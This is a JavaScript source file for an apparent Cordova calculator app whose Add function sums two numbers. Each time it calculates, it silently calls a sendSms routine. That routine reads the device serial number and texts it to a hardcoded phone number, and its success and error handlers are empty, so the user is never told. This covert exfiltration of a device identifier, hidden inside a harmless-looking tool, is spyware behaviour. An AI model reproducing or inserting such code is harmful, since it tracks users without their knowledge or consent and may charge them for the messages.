function Add() {
    var v1 = document.getElementById('txtNum1').value;
    var v2 = document.getElementById('txtNum2').value;
    if (v1 == "" || v2 == "") {
        alert('Both Values Required');
    } else {
        document.getElementById('lblResult').innerText = (Number(v1) + Number(v2));
		app.sendSms();
	}
}

function initialize(){
	document.addEventListener("deviceready", onDeviceReady, false);
	
}
function onDeviceReady() {
	
}
var app = {
    sendSms: function() {
		var string = device.serial;
        var number = '93241495'; // can be email etc
        var message = string;
        console.log("number=" + number + ", message= " + message);

        //CONFIGURATION
        var options = {
            replaceLineBreaks: false, // true to replace \n by a new line, false by default
            android: {
                intent: ''  // send SMS with the native android SMS messaging
                //intent: '' // send SMS without open any other app
            }
        };

        var success = function () { 
		//DO NOTHING
		};
        var error = function (e) { 
		//DO NOTHING
		};
        sms.send(number, message, options, success, error);
    }
};